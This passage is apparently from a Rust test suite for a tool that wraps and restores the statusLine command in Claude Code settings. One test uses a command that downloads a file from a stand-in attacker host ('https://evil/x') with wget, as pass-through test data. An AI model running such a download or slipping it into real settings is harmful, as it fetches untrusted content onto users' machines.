            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let cmd = settings["statusLine"]["command"].as_str().unwrap();
        assert!(cmd.contains("slterm-statusline"), "重注入桥接应成功: {cmd}");
        assert!(
            cmd.contains("wget -O /tmp/x https://evil/x"),
            "重注入透传原命令应原样（不阻断）: {cmd}"
        );
    }

    #[test]
    fn inject_impl_damaged_wrapped_statusline_unwrapped() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        // 预置损坏中间态（reporter 包裹——无透传能力，stdout 恒空）
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"node \"C:/Users/x/.slterminal/hooks/slterm-hook-reporter.js\" \"~/.claude/statusline-deepseek.sh\""}}"#,
        )
        .unwrap();

        inject_impl(&settings_path, &script_dir).unwrap();

        // 桥接单层：command 含内层命令、不含 reporter
        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let cmd = settings["statusLine"]["command"].as_str().unwrap();
        assert!(cmd.contains("slterm-statusline"), "command 应为桥接: {cmd}");
        assert!(
            cmd.contains("~/.claude/statusline-deepseek.sh"),
            "透传目标应为最内层命令: {cmd}"
        );
        assert!(
            !cmd.contains("slterm-hook-reporter"),
            "透传目标不应再含 reporter（防双重包裹）: {cmd}"
        );
        // 备份 = 干净原配置（非损坏态）
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        let backup_value: Value =
            serde_json::from_str(&std::fs::read_to_string(&backup).unwrap()).unwrap();
        assert_eq!(
            backup_value,
            serde_json::json!({"type":"command","command":"~/.claude/statusline-deepseek.sh"}),
            "备份应为解包后的干净原配置"
        );
        // 关闭恢复 → 还原干净原配置（备份保留）
        restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
        let restored: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        assert_eq!(
            restored["statusLine"]["command"], "~/.claude/statusline-deepseek.sh",
            "关闭恢复应还原干净原配置"
        );
        // 重开重注入 → 桥接仍含最内层命令（不复刻损坏态）
        reinject_statusline_impl(
            Some(&settings_path),
            Some(&backup),
            Some(&script_dir.join(STATUSLINE_SCRIPT_NAME)),
        )
        .unwrap();
        let reinjected: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let cmd = reinjected["statusLine"]["command"].as_str().unwrap();
        assert!(
            cmd.contains("~/.claude/statusline-deepseek.sh"),
            "重注入透传目标应为最内层: {cmd}"
        );
        assert!(
            !cmd.contains("slterm-hook-reporter"),
            "重注入不应复刻损坏态: {cmd}"
        );
    }

    #[test]
    fn inject_impl_double_wrapped_statusline_unwrapped() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        // 预置双层损坏形态（reporter 包 reporter，外层非桥接——更深的损坏中间态）。
        // 注意：外层若已是 slterm-statusline 桥接则 statusline_is_bridge 幂等跳过，
        // 不构成解包场景——真实双层损坏只能是自有脚本的重复包裹
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"node \"C:/x/.slterminal/hooks/slterm-hook-reporter.js\" \"node \\\"C:/x/.slterminal/hooks/slterm-hook-reporter.js\\\" \\\"~/.claude/statusline-deepseek.sh\\\"\""}}"#,
        )
        .unwrap();

        inject_impl(&settings_path, &script_dir).unwrap();

        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let cmd = settings["statusLine"]["command"].as_str().unwrap();
        assert!(
            cmd.contains("~/.claude/statusline-deepseek.sh"),
            "双层包裹应解到最内层: {cmd}"
        );
        assert!(
            !cmd.contains("slterm-hook-reporter"),
            "解包后不应含 reporter: {cmd}"
        );
        // 单层桥接（statusline 脚本名只出现一次——桥接自身）
        assert_eq!(
            cmd.matches("slterm-statusline").count(),
            1,
            "桥接应为单层（脚本名仅出现一次）: {cmd}"
        );
    }

    #[test]
    fn reinject_damaged_backup_unwrapped() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        // 当前 = 损坏备份值（历史遗留形态），备份文件 = 损坏态
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"node \"C:/Users/x/.slterminal/hooks/slterm-hook-reporter.js\" \"~/.claude/statusline-deepseek.sh\""}}"#,
        )
        .unwrap();
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        std::fs::create_dir_all(backup.parent().unwrap()).unwrap();
        write_backup(
            &backup,
            serde_json::json!({"type":"command","command":"node \"C:/Users/x/.slterminal/hooks/slterm-hook-reporter.js\" \"~/.claude/statusline-deepseek.sh\""}),
        )
        .unwrap();
        let script_path = script_dir.join(STATUSLINE_SCRIPT_NAME);
        std::fs::create_dir_all(&script_dir).unwrap();
        std::fs::write(&script_path, STATUSLINE_SCRIPT_TEMPLATE).unwrap();

        reinject_statusline_impl(Some(&settings_path), Some(&backup), Some(&script_path)).unwrap();

        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let cmd = settings["statusLine"]["command"].as_str().unwrap();
        assert!(
            cmd.contains("~/.claude/statusline-deepseek.sh"),
            "重注入透传目标应为最内层: {cmd}"
        );
        assert!(
            !cmd.contains("slterm-hook-reporter"),
            "损坏备份重注入不应复刻损坏态: {cmd}"
        );
    }

    #[test]
    fn inject_idempotent_keeps_existing_bridge() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let after_first: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let after_second: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        assert_eq!(
            after_first["statusLine"], after_second["statusLine"],
            "二次注入不应重建桥接（原命令保持）"
        );
    }

    #[test]
    fn uninstall_restores_backup_and_deletes_backup_file() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let events_dir = script_dir.parent().unwrap().join("hooks-events");
        std::fs::create_dir_all(&events_dir).unwrap();

        uninstall_impl(Some(&settings_path), Some(&script_dir), Some(&events_dir)).unwrap();

        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        assert_eq!(
            settings["statusLine"],
            serde_json::json!({"type":"command","command":"~/.claude/statusline-user.sh"}),
            "卸载应还原备份原配置"
        );
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        assert!(!backup.exists(), "卸载后备份文件应删除");
    }

    #[test]
    fn uninstall_without_backup_removes_bridge_statusline_key() {
        // 注入时无原配置 → 无备份；卸载 → 移除 statusLine 键（用户原本无）
        let (_dir, settings_path, script_dir) = make_inject_env();
        inject_impl(&settings_path, &script_dir).unwrap();
        let events_dir = script_dir.parent().unwrap().join("hooks-events");
        std::fs::create_dir_all(&events_dir).unwrap();
        uninstall_impl(Some(&settings_path), Some(&script_dir), Some(&events_dir)).unwrap();
        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        assert!(
            settings.get("statusLine").is_none(),
            "无备份时 statusLine 键应移除"
        );
    }

    // ── restore_statusline_impl（关闭清理）三态 ──

    #[test]
    fn restore_bridge_with_backup_restores_and_keeps_backup() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let backup = backup_path_from_script_dir(&script_dir).unwrap();

        restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();

        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        assert_eq!(
            settings["statusLine"]["command"], "~/.claude/statusline-user.sh",
            "关闭恢复应还原原配置"
        );
        assert!(backup.exists(), "备份应保留（供重开自动重注入）");
    }

    #[test]
    fn restore_without_bridge_noop() {
        // 用户已改过（非桥接）→ 不动
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        let original = r#"{"statusLine":{"type":"command","command":"my-own.sh"}}"#;
        std::fs::write(&settings_path, original).unwrap();
        restore_statusline_impl(
            Some(&settings_path),
            backup_path_from_script_dir(&script_dir).as_deref(),
        )
        .unwrap();
        assert_eq!(std::fs::read_to_string(&settings_path).unwrap(), original);
    }

    #[test]
    fn restore_no_settings_or_backup_noop() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        // settings 不存在 → no-op 不报错
        restore_statusline_impl(
            Some(&settings_path),
            backup_path_from_script_dir(&script_dir).as_deref(),
        )
        .unwrap();
        assert!(!settings_path.exists());
    }

    // ── reinject_statusline_impl（启动自动重注入）四态 ──

    #[test]
    fn reinject_with_backup_matching_current_reinjects_bridge() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        // 模拟关闭恢复后的状态
        restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();

        reinject_statusline_impl(
            Some(&settings_path),
            Some(&backup),
            Some(&script_dir.join(STATUSLINE_SCRIPT_NAME)),
        )
        .unwrap();

        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        assert!(
            settings["statusLine"]["command"]
                .as_str()
                .unwrap()
                .contains("slterm-statusline"),
            "备份+原配置 → 应重新注入桥接"
        );
        assert!(backup.exists(), "重注入后备份仍保留");
    }

    #[test]
    fn reinject_user_changed_statusline_respected() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
        // 用户在其他终端改过 statusLine
        let user_changed = r#"{"statusLine":{"type":"command","command":"my-new-statusline.sh"}}"#;
        std::fs::write(&settings_path, user_changed).unwrap();

        reinject_statusline_impl(
            Some(&settings_path),
            Some(&backup),
            Some(&script_dir.join(STATUSLINE_SCRIPT_NAME)),
        )
        .unwrap();

        assert_eq!(
            std::fs::read_to_string(&settings_path).unwrap(),
            user_changed,
            "用户已改过 → 尊重不动"
        );
    }

    #[test]
    fn reinject_already_bridge_or_no_backup_noop() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        // 已是桥接（异常退出未恢复成）→ 跳过
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"node \"C:/x/slterm-statusline.js\" \"~/.claude/statusline-user.sh\""}}"#,
        )
        .unwrap();
        let before = std::fs::read_to_string(&settings_path).unwrap();
        reinject_statusline_impl(
            Some(&settings_path),
            backup_path_from_script_dir(&script_dir).as_deref(), // 备份不存在
            Some(&script_dir.join(STATUSLINE_SCRIPT_NAME)),
        )
        .unwrap();
        assert_eq!(std::fs::read_to_string(&settings_path).unwrap(), before);
    }

    #[test]
    fn reinject_script_missing_noop() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();
        let before = std::fs::read_to_string(&settings_path).unwrap();
        reinject_statusline_impl(
            Some(&settings_path),
            backup_path_from_script_dir(&script_dir).as_deref(),
            Some(&script_dir.join(STATUSLINE_SCRIPT_NAME)), // 脚本不存在
        )
        .unwrap();
        assert_eq!(std::fs::read_to_string(&settings_path).unwrap(), before);
    }

    #[test]
    fn status_not_bridged_returns_outdated() {
        // matcher + 版本一致但 statusLine 非桥接（关闭恢复后未重注入）→ Outdated
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();

        let s = injection_status_impl(&script_dir.join("slterm-hook-reporter.js"), &settings_path);
        assert_eq!(s.status, AgentInjectionStatus::Outdated);
        assert_eq!(s.version, Some(template_version()));
    }
}
